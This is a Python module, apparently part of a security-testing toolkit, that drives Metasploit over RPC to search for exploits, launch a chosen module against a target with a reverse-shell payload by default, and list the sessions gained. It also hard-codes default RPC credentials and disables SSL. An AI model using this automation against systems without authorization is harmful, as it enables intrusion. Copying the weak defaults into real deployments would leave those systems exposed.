""" Metasploit Wrapper - Exploitation Framework Integration """
from pymetasploit3.msfrpc import MsfRpcClient
from typing import Dict, List, Optional
import time
from .base_wrapper import (
    BaseWrapper,
    ToolResult,
    Finding,
    ToolStatus,
    SeverityLevel
)


class MetasploitWrapper(BaseWrapper):
    """
    Wrapper for Metasploit Framework via RPC
    Features:
    - Exploit search
    - Module execution
    - Session management
    - Post-exploitation
    """

    def __init__(self, config: Optional[Dict] = None):
        """Initialize Metasploit wrapper"""
        config = config or {}
        self.password = config.get('password', 'msf123')
        self.username = config.get('username', 'msf')
        self.host = config.get('host', '127.0.0.1')
        self.port = config.get('port', 55553)
        self.client = None
        super().__init__(config)
        if self.is_available:
            self._connect()

    def _get_tool_name(self) -> str:
        return "Metasploit"

    def _check_tool_availability(self) -> bool:
        """Check if MSF RPC is running"""
        try:
            # Need to access attributes, not call config as function
            password = getattr(self, 'password', 'msf123')
            username = getattr(self, 'username', 'msf')
            host = getattr(self, 'host', '127.0.0.1')
            port = getattr(self, 'port', 55553)
            
            test_client = MsfRpcClient(
                password,
                username=username,
                server=host,
                port=port,
                ssl=False
            )
            test_client.core.version()
            return True
        except Exception as e:
            print(f"[DEBUG] MSF RPC not available: {e}")
            return False

    def _connect(self):
        """Connect to MSF RPC"""
        try:
            self.client = MsfRpcClient(
                self.password,
                username=self.username,
                server=self.host,
                port=self.port,
                ssl=False
            )
            print(f"[*] Connected to Metasploit RPC")
        except Exception as e:
            print(f"[!] Failed to connect to MSF RPC: {e}")
            self.client = None

    def get_version(self) -> Optional[str]:
        """Get Metasploit version"""
        if self.client:
            try:
                return self.client.core.version()['version']
            except:
                pass
        return None

    def search_exploits(self, query: str) -> List[Dict]:
        """
        Search for exploits matching query
        Args:
            query: Search term (e.g., "apache", "CVE-2021-44228")
        Returns:
            List of matching exploits
        """
        if not self.client:
            return []
        try:
            print(f"[*] Searching exploits for: {query}")
            results = self.client.modules.search(query)
            exploits = []
            for module_name in results:
                if 'exploit/' in module_name:
                    exploits.append({
                        'name': module_name,
                        'fullname': module_name
                    })
            print(f"[*] Found {len(exploits)} exploits")
            return exploits
        except Exception as e:
            print(f"[!] Search failed: {e}")
            return []

    def get_exploit_info(self, module_name: str) -> Optional[Dict]:
        """Get detailed information about an exploit"""
        if not self.client:
            return None
        try:
            exploit = self.client.modules.use('exploit', module_name)
            info = {
                'name': module_name,
                'description': exploit.description,
                'references': exploit.references,
                'targets': exploit.targets,
                'options': exploit.options,
                'required_options': exploit.required
            }
            return info
        except Exception as e:
            print(f"[!] Failed to get info: {e}")
            return None

    def execute(self, target: str, options: Optional[Dict] = None) -> ToolResult:
        """
        Execute exploit against target
        Args:
            target: Target IP/hostname
            options: Dict with:
                - module: Exploit module name
                - payload: Payload to use (default: reverse_tcp)
                - lhost: Listening host (attacker IP)
                - lport: Listening port
        """
        options = options or {}
        module_name = options.get('module')
        if not module_name:
            return ToolResult(
                tool_name=self.tool_name,
                target=target,
                status=ToolStatus.FAILED,
                error_message="No module specified"
            )
        start_time = time.time()
        result = ToolResult(
            tool_name=self.tool_name,
            target=target,
            status=ToolStatus.RUNNING
        )
        try:
            print(f"[*] Loading exploit: {module_name}")
            exploit = self.client.modules.use('exploit', module_name)
            # Set target
            exploit['RHOSTS'] = target
            # Set payload
            payload_name = options.get('payload', 'generic/shell_reverse_tcp')
            exploit.payload = payload_name
            # Set payload options
            if 'lhost' in options:
                exploit['LHOST'] = options['lhost']
            if 'lport' in options:
                exploit['LPORT'] = options['lport']
            # Execute
            print(f"[*] Executing exploit against {target}...")
            exec_result = exploit.execute()
            duration = time.time() - start_time
            # Check if session was created
            if exec_result and 'session_id' in exec_result:
                session_id = exec_result['session_id']
                finding = Finding(
                    finding_id=f"exploit_{module_name}_{target}",
                    title=f"Exploitation Successful: {module_name}",
                    description=f"Gained session {session_id} on {target}",
                    severity=SeverityLevel.CRITICAL,
                    affected_component=target,
                    evidence={
                        'session_id': session_id,
                        'module': module_name,
                        'payload': payload_name
                    }
                )
                result.status = ToolStatus.COMPLETED
                result.findings = [finding.to_dict()]
                print(f"[✓] Exploitation successful! Session: {session_id}")
            else:
                result.status = ToolStatus.COMPLETED
                result.error_message = "Exploit executed but no session created"
                print(f"[!] Exploit ran but didn't create session")
            result.duration = duration
        except Exception as e:
            result.status = ToolStatus.FAILED
            result.error_message = str(e)
            result.duration = time.time() - start_time
            print(f"[✗] Exploitation failed: {e}")
        return result

    def list_sessions(self) -> List[Dict]:
        """List active sessions"""
        if not self.client:
            return []
        try:
            sessions = self.client.sessions.list
            return [
                {
                    'id': sid,
                    'info': session['info'],
                    'username': session.get('username', 'unknown'),
                    'tunnel_peer': session.get('tunnel_peer', 'unknown')
                }
                for sid, session in sessions.items()
            ]
        except:
            return []

    def parse_output(self, raw_output: str) -> List[Finding]:
        """Parse Metasploit output (not typically used)"""
        return []

    def cleanup(self):
        """Cleanup RPC connection"""
        if self.client:
            try:
                self.client.core.stop()
            except:
                pass


# Test
if __name__ == "__main__":
    print("Testing Metasploit Wrapper...")
    wrapper = MetasploitWrapper()
    print(f"Available: {wrapper.is_available}")
    if wrapper.is_available:
        print(f"Version: {wrapper.get_version()}")
        # Search test
        results = wrapper.search_exploits("apache")
        print(f"\nFound {len(results)} Apache exploits")
        if results:
            print(f"Example: {results[0]['name']}")
        # List sessions
        sessions = wrapper.list_sessions()
        print(f"\nActive sessions: {len(sessions)}")
